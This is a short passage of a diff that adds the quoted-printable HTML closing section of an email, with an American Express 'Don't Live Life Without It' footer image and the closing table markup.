+Don't Live Life Without It" src=3D"https://image.member.americanexpress.com=
+/lib/fe9013727565037a72/m/25/2022_v4.0_dllwi-footer.jpg" width=3D620> </TD>=
+</TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1pd0 style=3D"PADDING-BOTTOM: 15px; PADDING-TOP: 16px; PADDING=
+-LEFT: 0px; PADDING-RIGHT: 0px" vAlign=3Dtop align=3Dcenter></TD></TR></TBO=
+DY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY>
+<DIV></DIV>
+<DIV></DIV></DIV></BODY></HTML>
